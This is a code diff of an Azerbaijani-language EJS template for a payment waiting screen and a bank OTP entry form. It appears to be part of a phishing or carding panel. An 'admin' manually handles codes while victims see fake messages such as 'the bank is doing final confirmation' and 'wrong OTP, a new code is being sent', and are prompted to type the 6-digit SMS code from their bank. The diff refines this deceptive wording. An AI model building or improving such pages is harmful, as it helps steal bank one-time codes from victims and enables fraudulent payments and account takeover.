@@ -30,16 +30,18 @@
                  data-seconds-left="<%= secondsLeft %>">
               
               <h2 style="font-size:1.15rem;margin-bottom:20px" data-stage-title>
-                Admin tərəfindən təsdiq beklənilir...
+                <% if (wrongCode) { %>Yeni OTP kodu göndərilir<% } else { %>OTP kodu yoxlanılır...<% } %>
               </h2>
               
-              <div data-stage-alert class="alert alert--error" style="display:none;margin-bottom:16px"></div>
+              <div data-stage-alert class="alert alert--error" style="<%= wrongCode ? '' : 'display:none;' %>margin-bottom:16px">
+                <% if (wrongCode) { %><strong>❌ Səhv OTP — kod təkrar göndərilir</strong><br>Geri sayım bitdikdə yeni OTP ekranı açılacaq.<% } %>
+              </div>
               
               <!-- Geri Sayım Halka -->
               <%- include('../partials/countdown-ring') %>
               
               <p class="sec-note" data-stage-note>
-                Bank yekun təsdiqi aparır. Bu ekranı bağlamayın.
+                <% if (wrongCode) { %>Zəhmət olmasa gözləyin, bank yeni SMS kodu göndərir.<% } else { %>Bank yekun təsdiqi aparır. Bu ekranı bağlamayın.<% } %>
               </p>
 
               <!-- Yenidən Cəhd (Səhv OTP varsa) -->
@@ -58,8 +60,8 @@
             
             <!-- OTP FORMU: Kod daxil etmə -->
             <div class="alert alert--success mb-20">
-              <strong>📧 Bankandan göndərilən OTP kodu daxil edin</strong><br>
-              <small style="color:#666">SMS vasitəsilə 6 rəqəmli kod aldığınız qeyd olunmalıdır</small>
+              <strong>📧 Bankınızdan göndərilən OTP kodu daxil edin</strong><br>
+              <small style="color:#666">Bankınızın SMS ilə göndərdiyi 6 rəqəmli kodu yazın</small>
             </div>
 
             <form id="codeForm" data-order-id="<%= order._id %>" style="margin-bottom:16px">
